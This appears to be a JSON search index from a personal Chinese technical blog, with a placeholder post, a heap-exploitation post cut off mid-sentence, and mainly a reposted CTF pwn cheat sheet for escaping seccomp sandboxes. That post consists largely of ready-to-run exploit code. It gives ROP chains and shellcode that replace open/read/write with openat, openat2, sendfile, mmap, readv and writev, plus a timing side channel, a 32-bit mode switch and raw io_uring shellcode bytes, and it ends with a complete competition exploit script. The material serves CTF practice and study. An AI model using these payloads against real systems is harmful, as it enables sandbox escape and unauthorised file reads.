

[
  
  
    
    
      {
        "title": "我的第一篇博客",
        "excerpt": "开始吧，我的blog\n",
        "content": "这里是文章的正文内容，可以用 Markdown 语法写。\n\n一级标题\n\n二级标题\n\n\n  列表项1\n  列表项2\n\n\n代码示例：\n\n1\nputs \"Hello, Jekyll!\"\n\n\nundefined\n\n",
        "url": "/%E6%8A%80%E6%9C%AF/2025/06/16/my-first-post/"
      },
    
      {
        "title": "seccomp沙盒绕过",
        "excerpt": "开始吧，我的blog\n",
        "content": "seccomp沙盒绕过 (rop与shellcode集合)\n\n前言\n\n起因\n\n在每次遇到沙盒时都要重新写rop或者shellcode，这非常不健康，所以我写了这篇文章，尽可能的让这里的代码能拿来就能用。\n\n在正篇里将直接用rop或shellcode中使用的函数进行命名，这样可以快速并清晰的找到要用的代码。\n\n注意: open+read+write为模版，之后相对应的代码可以直接进行替换，比如pread64可以直接将read进行替换（活字印刷术）。\n\n以下为例题程序\n\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n# rop对应程序\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\nchar v4[16]; // [rsp+0h] [rbp-10h] BYREF\n\nprintf(\"%lp\\n\", &amp;printf, envp);\ngets(v4);\nreturn 0;\n}\n# python3脚本\nfrom pwncli import *\ncontext(arch='amd64',os='linux',log_level='debug')\np   = lambda s,t: print(f\"\\033[0;31;43m{s.ljust(15, ' ') + '-------------------------&gt;' + hex(t)}\\033[0m\")\n\nsh = process(\"./rop\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\nlibc.address = eval(sh.recvline()) - libc.sym[\"printf\"]\n\n# ---------需要更改\npop_rdi = libc.address + 0x000000000002a3e5\npop_rsi = libc.address + 0x0000000000163f88\npop_rdx_r12 = libc.address + 0x000000000011f2e7\npop_rcx = libc.address + 0x000000000003d1ee\n\nrop = b\"a\"*0x18 + [rop程序]  # ------\nsh.sendline(rop)\n\nsh.interactive()\n  \n\n\n\n  \n\n\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n# python3脚本\nfrom pwncli import *\ncontext(arch='amd64',os='linux',log_level='debug')\np   = lambda s,t: print(f\"\\033[0;31;43m{s.ljust(15, ' ') + '-------------------------&gt;' + hex(t)}\\033[0m\")\n\nsh = process(\"./shellcode\")\n\nshellcode = [shellcode代码] #-----------\nsh.sendline(asm(shellcode))\n\nsh.interactive()\n  \n\n\n沙盒\n\n沙盒是一种对程序的保护，他可以禁用一些系统调用从而增加pwn题目的难度，迫使pwner们通过ORW的方法进行绕过沙盒。比如最常见的禁用execve，那么就只能通过open，read，write来直接读取flag的内容。\n\n沙盒检测\n\n1\nseccomp-tools dump ./pwn\n\n\n正篇\n\nopen+read+write\n\nrop\n\n1\n2\n3\n4\n5\n6\n7\n8\nrop = b\"a\"*0x18\nrop += flat(pop_rdi, 0, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, libc.sym[\"read\"])  # read\nrop += flat(pop_rdi, libc.sym[\"_IO_list_all\"]+8, pop_rsi, 0, pop_rdx_r12, 0, 0, libc.sym[\"open\"])  # open\nrop += flat(pop_rdi, 3, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, libc.sym[\"read\"])  # read\nrop += flat(pop_rdi, 1, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, libc.sym[\"write\"])  # write\n\nsh.sendline(rop)\nsh.sendline(\"/flag\\x00\")\n\n\nshellcode\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\nshellcode = shellcraft.amd64.pushstr(\"/flag\")\nshellcode += shellcraft.amd64.linux.open('rsp', 0, 0)\nshellcode += shellcraft.amd64.linux.read('rax', 'rsp', 0x200)\nshellcode += shellcraft.amd64.linux.write(1, 'rsp', 0x200)\nflag_name = b'/flag'\nshellcode = \"\"\nshellcode += \"\"\" \n    mov r12,\"\"\" + str(u64(flag_name.ljust(8,b'\\x00'))) + \"\"\"\n    mov [rsp],r12\n\"\"\"\n\nshellcode += \"\"\"\n    mov rdi, rsp\n    mov rsi, 0\n    mov rdx, 0\n    mov rax,2\n    syscall\n\"\"\"   # open\n\nshellcode += \"\"\"\n    mov rdi, 3\n    mov rsi, rsp\n    mov rdx, 0x100\n    xor rax, rax\n    syscall\n\"\"\"   # read\n\nshellcode += \"\"\"\n    mov rdi, 1\n    mov rsi, rsp\n    mov rdx, 0x100\n    mov rax, 1\n    syscall\n\"\"\"   # write\n\n\nopen替代\n\nopenat\n\n\n  rop\n\n  1\nrop += flat(pop_rdi, 3, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0, 0, libc.sym[\"openat\"])\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\nshellcode += shellcraft.amd64.linux.openat(3,'rsp', 0)\n\n\nshellcode += \"\"\"\nmov rdi, -100 #mov rdi, 3也可以，但是不通用，要是fd=3所指的目录\nmov rsi, rsp\nmov rdx, 0\nmov r10, 0\nmov rax,0x101\nsyscall\n\"\"\"\n  \n\n\nopenat2\n\n\n  rop\n\n  1\n2\n3\n4\n5\n6\n7\n8\nbss_addr = 0x000000000404020 # 写bss段\nexec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12\nrop = b\"a\" * 0x18\nrop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])\nrop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)\n\nsh.sendline(rop)\nsh.sendline([shellcode]) # 填写shellcode\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\nshellcode = '''\nmov r12, 0x0067616c66\nmov [rsp], r12\n\nxor rax, rax\npush rax\npush rax\npush rax\npush rax\n\nmov rdi, -100       \nlea rsi, [rsp+0x20]  \nmov rdx, rsp         \nmov r10, 0x18        \nmov rax, 437        \nsyscall\nmov rdi, 1\nmov rsi, rax\nmov rdx, 0\nmov r10, 0x100\nmov rax, 0x28\nsyscall\n'''\n  \n\n\nread替代\n\npread\n\n\n  rop\n\n  1\nrop += flat(pop_rdi, 3, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, pop_rcx, 0, libc.sym[\"pread\"])\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\nshellcode += shellcraft.amd64.linux.pread('rax', 'rsp', 0x200, 0)\n\n\nshellcode += \"\"\"\nmov rdi, 3\nmov rsi, rsp\nmov rdx, 0x100\nmov r10, 0\nmov rax, 0x11\nsyscall\n\"\"\"   # read\n  \n\n\nreadv\n\n\n  rop\n\n  1\n2\n3\n4\n5\n6\n7\n8\nbss_addr = 0x000000000404020 # 写bss段\nexec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12\nrop = b\"a\" * 0x18\nrop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])\nrop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)\n\nsh.sendline(rop)\nsh.sendline([shellcode]) # 填写shellcode\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\nshellcode += '''\npush 0x200\npush 0x200\nmov [rsp],rsp\n'''\nshellcode += shellcraft.amd64.linux.readv('rax', 'rsp', 1)\n\n\nshellcode += \"\"\"\npush 0x200\npush 0x200\nmov [rsp],rsp\nmov rdi, 3\nmov rsi, rsp\nmov rdx, 0x1\nmov rax, 0x13\nsyscall\n\"\"\"   # read\n  \n\n\npreadv\n\n\n  rop\n\n  1\n2\n3\n4\n5\n6\n7\n8\nbss_addr = 0x000000000404020 # 写bss段\nexec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12\nrop = b\"a\" * 0x18\nrop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])\nrop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)\n\nsh.sendline(rop)\nsh.sendline([shellcode]) # 填写shellcode\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\nshellcode += '''\npush 0x200\npush 0x200\nmov [rsp],rsp\n'''\nshellcode += shellcraft.amd64.linux.preadv('rax', 'rsp', 1, 0)\nshellcode += \"\"\"\npush 0x200\npush 0x200\nmov [rsp],rsp\nmov rdi, 3\nmov rsi, rsp\nmov rdx, 0x1\nmov r10, 0\nmov rax, 0x127\nsyscall\n\"\"\"   # read\n  \n\n\nmmap\n\n\n  rop\n\n  1\n2\n3\n4\n5\n6\n7\n8\nbss_addr = 0x000000000404020 # 写bss段\nexec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12\nrop = b\"a\" * 0x18\nrop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])\nrop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)\n\nsh.sendline(rop)\nsh.sendline([shellcode]) # 填写shellcode\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n# 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。\nshellcode += shellcraft.amd64.linux.mmap(0x777721000, 0x100, 1, 2, 3, 0)\n\n\n# 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。\nshellcode += \"\"\"\nmov rdi, 0x777721000\nmov rsi, 0x100\nmov rdx, 1\nmov r10, 2\nmov r8, 3\nmov r9, 0\nmov rax, 9\nsyscall\n\"\"\"   # read\n  \n\n\nsendfile\n\nsendfile可以直接代替write与read\n\n\n  rop\n\n  1\nrop += flat(pop_rdi, 1, pop_rsi, 3, pop_rdx_r12, 0, 0, pop_rcx, 0x100, libc.sym[\"sendfile\"])\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\nshellcode += shellcraft.amd64.linux.sendfile(1, \"rax\", 0, 0x200)\n\n\nshellcode += \"\"\"\nmov rdi, 1\nmov rsi, rax\nmov rdx, 0\nmov r10, 0x100\nmov rax, 0x28\nsyscall\n\"\"\" \n  \n\n\nwrite替代\n\nwritev\n\n\n  rop\n\n  1\n2\n3\n4\n5\n6\n7\n8\nbss_addr = 0x000000000404020 # 写bss段\nexec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12\nrop = b\"a\" * 0x18\nrop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])\nrop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)\n\nsh.sendline(rop)\nsh.sendline([shellcode]) # 填写shellcode\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n# 注意flag输出不在开头\nshellcode += '''\npush 0x200\npush 0x200\nmov [rsp],rsp\n'''\nshellcode += shellcraft.amd64.linux.writev(1, 'rsp', 0x1)\n\n\n# 注意flag输出不在开头\nshellcode += \"\"\"\npush 0x200\npush 0x200\nmov [rsp],rsp\nmov rdi, 1\nmov rsi, rsp\nmov rdx, 0x1\nmov rax, 0x14\nsyscall\n\"\"\"   # write\n  \n\n\nsendfile\n\nsendfile可以直接代替write与read\n\n\n  rop\n\n  1\nrop += flat(pop_rdi, 1, pop_rsi, 3, pop_rdx_r12, 0, 0, pop_rcx, 0x100, libc.sym[\"sendfile\"])\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\nshellcode += shellcraft.amd64.linux.sendfile(1, \"rax\", 0, 0x200)\nshellcode += \"\"\"\nmov rdi, 1\nmov rsi, rax\nmov rdx, 0\nmov r10, 0x100\nmov rax, 0x28\nsyscall\n\"\"\" \n  \n\n\n侧信道攻击\n\n\n  这个攻击比较特殊，实在没有输出手段的时候就利用此方法，此方法相当不准确，谨慎使用。\n\n\n\n  如果rop同上面一样使用\n\n  1\n2\n3\n4\n5\n6\n7\n8\nbss_addr = 0x000000000404020 # 写bss段\nexec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12\nrop = b\"a\" * 0x18\nrop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])\nrop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)\n\nsh.sendline(rop)\nsh.sendline([shellcode]) # 填写shellcode\n  \n\n  来转化成写shellcode\n\n\n接下来看shellcode怎么写。\n\n\n\n现在假设flag已经读到了栈上，但是没有办法读（没有系统调用 &amp; close(1)）。\n\n那么可以进行爆破，因为没有返回，所以爆破就只能看时间来判断。\n\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\nflag = ''\nfor offset in range(30):\nfor byte in range(0x20,0x80):\n  sh = process(\"./shellcode\")\n  shell = asm(shellcode + \"\"\"\n      infinite_loop: \n      cmp byte ptr[rsp+{}], {}\n      je infinite_loop\n          \"\"\".format(str(offset),str(byte)))\n  sh.sendlineafter(\"shellcode: \\n\",shell)\n  try:\n      sh.recv(timeout=0.2)\n      flag += chr(byte)\n      print(flag + \"---\" + str(byte))\n      sh.close()\n      break\n  except:\n      pass\n\n  print(flag + \"---\" + str(byte))\n  sh.close()\n  \n\n  shellcode为读取文件的code。\n\n\n\n\n\n  很慢，但可行。\n\n\n转32位\n\n利用条件\n\n\n  沙箱没有arch==ARCH_x86_64检测\n  可以使用mmmap或者mprotect和32位的地址\n\n\n\n  rop\n\n  可以调用mprotect来转化成写shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\nbss_addr = 0x000000000404020  # 写bss段\nexec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12\nrop = b\"a\" * 0x18\nrop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])\nrop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)\n\nsh.sendline(rop)\nsh.sendline([shellcode]) # 填写shellcode\n  \n\n\n\n  shellcode\n\n  1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\nshellcode64 = shellcraft.amd64.linux.mmap(0x700000, 0x1000, 7, 0x32, -1, 0)\nshellcode64 += shellcraft.amd64.linux.read(0, 0x700000, 0x1000)\nshellcode64 += \"\"\"\nmov rsp,0x700800\nmov DWORD PTR [rsp+4], 0x23\nmov DWORD PTR [rsp], 0x700000\nretfd\n\"\"\"\nshellcode32 = \"\"\"\npush 0x67616C66\n\"\"\"\n\nshellcode32 += \"\"\"\npush esp\npush 0\npush 0\npop edx\npop ecx\npop ebx\npush 5\npop eax\nint 0x80\n\"\"\"   # open\n\nshellcode32 += \"\"\"\npush eax\npush esp\npush 0x100\npop edx\npop ecx\nadd ecx, 0x20\npop ebx\npush 3\npop eax\nint 0x80\n\"\"\"   # read\nshellcode32 += \"\"\"\npush 1\npop ebx\npush 4\npop eax\nint 0x80\n\"\"\"   # write\nsh.sendline(asm(shellcode64, arch='amd64', bits=64))\nsh.sendline(asm(shellcode32, arch='i386', bits=32))\n  \n\n\n绕过close(1)\n\n侧信道攻击\n\n同write替代中的侧信道攻击\n\n远程链接socket&amp;connect\n\n有些程序会调用子进程，子进程对外开放，但是rop写后只能在主进程运行，输出没法显示在远程，或者close(1)，那么可以用此方法，此方法需要公网ip。\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;arpa/inet.h&gt;\n#include &lt;sys/socket.h&gt;\n\nint main() {\n    struct sockaddr_in *serv_addr = malloc(sizeof(struct sockaddr_in));\n    memset(serv_addr, 0, sizeof(struct sockaddr_in));\n    serv_addr-&gt;sin_family = AF_INET;\n    serv_addr-&gt;sin_addr.s_addr = inet_addr(\"127.0.0.1\");   //填入ip地址和端口\n    serv_addr-&gt;sin_port = htons(8888);\n    printf(%lp,*serv_addr);\n    return 0;\n}\n\n\nopen(\"/dev/pts/?\")\n\n使用open(\"/dev/pts/?\")重新打开标准输出\n\n超级代码\n\n这个代码利用了下面三个个系统调用\n\n1\n2\n3\n9\tcommon\tmmap\t\t\t__x64_sys_mmap\n425\tcommon\tio_uring_setup\t\t__x64_sys_io_uring_setup\n426\tcommon\tio_uring_enter\t\t__x64_sys_io_uring_enter\n\n\n汇编如下\n\npush   r15\nmov    ecx,0x1e\npush   r14\npush   r13\nxor    r13d,r13d\npush   r12\nmov    eax,r13d\npush   rbp\npush   rbx\nsub    rsp,0x68\nlea    rdi,[rsp-0x10]\nlea    rsi,[rsp-0x10]\nrep stos DWORD PTR es:[rdi],eax\nmov    edi,0x10\nmov    eax,0x1a9\nsyscall\nmov    ebx,0x9\nmov    r12,rax\nmov    r14d,eax\nmov    r8d,eax\nxor    r9d,r9d\nmov    r10d,0x1\nmov    edx,0x3\nxor    edi,edi\nmov    esi,0x1000\nmov    eax,ebx\nsyscall\nmov    r9d,0x8000000\nmov    rbp,rax\nmov    eax,ebx\nsyscall\nmov    r9d,0x10000000\nmov    r15,rax\nmov    eax,ebx\nsyscall\nmov    ecx,0x10\nmov    rbx,rax\nmov    rdi,rax\nmov    eax,r13d\nrep stos DWORD PTR es:[rdi],eax\nmov    edi,r12d\nmov    r12d,0x1aa\nxor    r9d,r9d\nxor    r8d,r8d\nmov    edx,0x1\nmov    esi,0x1\nmovabs rax,0xffffff9c00001012\nmov    QWORD PTR [rbx],rax\nlea    rax,[rip+0xc1]        # 0x7ffcf065b5c0\nmov    QWORD PTR [rbx+0x10],rax\nmov    eax,DWORD PTR [rsp+0x30]\nmov    DWORD PTR [rbp+rax*1+0x0],0x0\nmov    eax,DWORD PTR [rsp+0x1c]\ninc    DWORD PTR [rbp+rax*1+0x0]\nmov    eax,r12d\nsyscall\nmov    eax,DWORD PTR [rsp+0x54]\nmov    rdi,rbx\nmov    ecx,0x10\nmov    edx,DWORD PTR [r15+rax*1+0x8]\nmov    eax,r13d\nlea    r15,[rsp-0x74]\nrep stos DWORD PTR es:[rdi],eax\nmov    BYTE PTR [rbx],0x16\nmov    eax,DWORD PTR [rsp+0x30]\nmov    edi,r14d\nmov    DWORD PTR [rbx+0x4],edx\nmov    edx,0x1\nmov    QWORD PTR [rbx+0x10],r15\nmov    DWORD PTR [rbx+0x18],0x64\nmov    DWORD PTR [rbp+rax*1+0x0],0x0\nmov    eax,DWORD PTR [rsp+0x1c]\ninc    DWORD PTR [rbp+rax*1+0x0]\nmov    eax,r12d\nsyscall\nmov    ecx,0x10\nmov    eax,r13d\nmov    rdi,rbx\nmov    edx,0x3\nrep stos DWORD PTR es:[rdi],eax\nmov    QWORD PTR [rbx+0x10],r15\nmov    edi,r14d\nmovabs rax,0x100000017\nmov    QWORD PTR [rbx],rax\nmov    eax,DWORD PTR [rsp+0x30]\nmov    DWORD PTR [rbx+0x18],0x64\nmov    DWORD PTR [rbp+rax*1+0x0],0x0\nmov    eax,DWORD PTR [rsp+0x1c]\ninc    DWORD PTR [rbp+rax*1+0x0]\nmov    eax,r12d\nsyscall\nadd    rsp,0x68\nxor    eax,eax\npop    rbx\npop    rbp\npop    r12\npop    r13\npop    r14\npop    r15\nret\ncs (bad)\n\n\n机器码如下\n\n1\nshellcode = b'AW\\xb9\\x1e\\x00\\x00\\x00AVAUE1\\xedATD\\x89\\xe8USH\\x83\\xechH\\x8d|$\\xf0H\\x8dt$\\xf0\\xf3\\xab\\xbf\\x10\\x00\\x00\\x00\\xb8\\xa9\\x01\\x00\\x00\\x0f\\x05\\xbb\\t\\x00\\x00\\x00I\\x89\\xc4A\\x89\\xc6A\\x89\\xc0E1\\xc9A\\xba\\x01\\x00\\x00\\x00\\xba\\x03\\x00\\x00\\x001\\xff\\xbe\\x00\\x10\\x00\\x00\\x89\\xd8\\x0f\\x05A\\xb9\\x00\\x00\\x00\\x08H\\x89\\xc5\\x89\\xd8\\x0f\\x05A\\xb9\\x00\\x00\\x00\\x10I\\x89\\xc7\\x89\\xd8\\x0f\\x05\\xb9\\x10\\x00\\x00\\x00H\\x89\\xc3H\\x89\\xc7D\\x89\\xe8\\xf3\\xabD\\x89\\xe7A\\xbc\\xaa\\x01\\x00\\x00E1\\xc9E1\\xc0\\xba\\x01\\x00\\x00\\x00\\xbe\\x01\\x00\\x00\\x00H\\xb8\\x12\\x10\\x00\\x00\\x9c\\xff\\xff\\xffH\\x89\\x03H\\x8d\\x05\\xc1\\x00\\x00\\x00H\\x89C\\x10\\x8bD$0\\xc7D\\x05\\x00\\x00\\x00\\x00\\x00\\x8bD$\\x1c\\xffD\\x05\\x00D\\x89\\xe0\\x0f\\x05\\x8bD$TH\\x89\\xdf\\xb9\\x10\\x00\\x00\\x00A\\x8bT\\x07\\x08D\\x89\\xe8L\\x8d|$\\x8c\\xf3\\xab\\xc6\\x03\\x16\\x8bD$0D\\x89\\xf7\\x89S\\x04\\xba\\x01\\x00\\x00\\x00L\\x89{\\x10\\xc7C\\x18d\\x00\\x00\\x00\\xc7D\\x05\\x00\\x00\\x00\\x00\\x00\\x8bD$\\x1c\\xffD\\x05\\x00D\\x89\\xe0\\x0f\\x05\\xb9\\x10\\x00\\x00\\x00D\\x89\\xe8H\\x89\\xdf\\xba\\x03\\x00\\x00\\x00\\xf3\\xabL\\x89{\\x10D\\x89\\xf7H\\xb8\\x17\\x00\\x00\\x00\\x01\\x00\\x00\\x00H\\x89\\x03\\x8bD$0\\xc7C\\x18d\\x00\\x00\\x00\\xc7D\\x05\\x00\\x00\\x00\\x00\\x00\\x8bD$\\x1c\\xffD\\x05\\x00D\\x89\\xe0\\x0f\\x05H\\x83\\xc4h1\\xc0[]A\\\\A]A^A_\\xc3./flag'\n\n\n比赛例题\n\n御网杯半决赛线下\n\n\n\n虽然保护全开，但是mmap把写入地方的权限改成可读可写可执行了，问题就是沙盒把orw和execve全禁了\n\n\n\n之前比赛一筹莫展，主要是积累函数太少了，可以用opennat,sendfile替代的\n\nexp:\n\n用opennat,sendfile替代\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\nfrom pwn import *\nfrom ctypes import *\n\npwn = './pwn'\n\nif args['REMOTE']:\n    io = remote('192.168.18.22', 8888)\nelse:\n    io = process(pwn)\n\ncontext(log_level='debug')\n#context.terminal = ['tmux','splitw','-h']\ncontext.binary = elf = ELF(pwn)\nrop = ROP(context.binary)\n\ns = lambda data: io.send(data)\nsa = lambda text, data: io.sendafter(text, data)\nsl = lambda data: io.sendline(data)\nsla = lambda text, data: io.sendlineafter(text, data)\nr = lambda num=4096: io.recv(num)\nru = lambda text: io.recvuntil(text)\npr = lambda num=4096: print(io.recv(num))\ninter = lambda: io.interactive()\n\nl32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))\nl64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))\nuu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)\nuu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))\nuu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)\nuuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))\n\nint16 = lambda data: int(data, 16)\n\nlg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))\n\ndef get_sb():\n    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))\n\ndef get_orw():\n    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']\n\ndef debug(script=f''):\n    script = f'b __call_tls_dtors'\n    gdb.attach(proc.pidof(io)[0], script)\n    pause()\n\ndef fmt(value, offset=14, size='hhn'):\n    if size == 'hhn':\n        num = value &amp; 0xff\n    elif size == 'hn':\n        num = value &amp; 0xffff\n    elif size == 'n':\n        num = value &amp; 0xffffffff\n    payload = f'%{num}c%{offset}size'.encode()\n    #value 是格式化字符串偏移          \n    return payload\n\nlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))\n\ndef cat_flag():\n    flag_header = b'flag{'\n    sleep(1)\n    sl('cat flag')\n    ru(flag_header)\n    flag = flag_header + ru('}') + b'}'\n    exit(0)\n\n#debug()\nshellcode = '''\n mov r12, 0x0067616c66 \n mov [rsp], r12\n xor rsi,rsi     \n xor r10, r10\n mov rdi, -100\n mov rsi, rsp\n mov rdx, 0\n mov rax,0x101\n syscall\n mov rdi, 1\n mov rsi, rax\n mov rdx, 0\n mov r10, 0x100\n mov rax, 0x28\n syscall\n'''\n\nsl(asm(shellcode))\n\n\ninter()\n\n\n用opennat2，sendfile替代的\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\nshellcode = '''\nmov r12, 0x0067616c66\nmov [rsp], r12\n\nxor rax, rax\npush rax\npush rax\npush rax\npush rax\n\nmov rdi, -100       \nlea rsi, [rsp+0x20]  \nmov rdx, rsp         \nmov r10, 0x18        \nmov rax, 437        \nsyscall\nmov rdi, 1\nmov rsi, rax\nmov rdx, 0\nmov r10, 0x100\nmov rax, 0x28\nsyscall\n'''\n\n\n用mmap，writev替代的\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\nshellcode = '''\nmov r12, 0x0067616c66\nmov [rsp], r12\n\nxor rax, rax\npush rax\npush rax\npush rax\npush rax\n\nmov rdi, -100       \nlea rsi, [rsp+0x20]  \nmov rdx, rsp         \nmov r10, 0x18        \nmov rax, 437        \nsyscall\nmov rdi, 0x777721000\nmov rsi, 0x100\nmov rdx, 1\nmov r10, 2\nmov r8, 3\nmov r9, 0\nmov rax, 9\nsyscall\nmov rbx, 0x777721000     \nmov rcx, 0x100         \nsub rsp, 0x20\nmov [rsp], rbx\nmov [rsp + 8], rcx\nmov rdi, 1              \nmov rsi, rsp           \nmov rdx, 1               \nmov rax, 0x14            \nsyscall\n'''\n\n\n一直在学习大佬的路上\n转载作者原文 https://www.cnblogs.com/xmiscx/p/18827064\n\n",
        "url": "/%E6%8A%80%E6%9C%AF/2025/08/01/my-second-post/"
      },
    
      {
        "title": "heap的IO链学习",
        "excerpt": "早早早\n",
        "content": "house of apple学习\n\n该题目大佬利用了house of emma和house of apple的组合攻击，最终实现了orw读取flag，在这里主要困难的点在于这里的edit也就修改chunk中的步骤只能一次，所以没办法直接利用house of emma（因为house of emma需要两次large bin attack，首先攻击pointer_guard将其修改为已知内容，第二攻击是攻击_IO_list_all，将其进行挟持到堆上，这样就可以控制FIFE的结构，实现最终的攻击效果），因此由于本题只能一次修改，没办法构成两次写，所以想到利用house of apple 可以实现pointer_guard进行覆盖为一个已知的值，这样在利用chain的值指向之后伪造的第二个file结构，对于这个结构可以实现house of emma的攻击方式，最终实现orw攻击\n\n查io链fpchain\n\nhouse of apple\n\nhouse of apple的攻击原理，简单来说就是利用了_IO_wstrn_overflow这个函数，通过利用file的结构，这个函数可以覆盖传入fp-&gt;_wide_data上的地址覆盖为可以知道的堆地址，攻击效果和进行一次large bin attack一样，实现任意地址写已知地址。\n\n1\n2\n3\n4\nexit()/fcloseall()\n  -&gt; _IO_cleanup()\n    -&gt; _IO_flush_all_lockp()\n      -&gt; 对 _IO_list_all 链表里每个 FILE 调用 vtable-&gt;_overflow（或其它 vtable 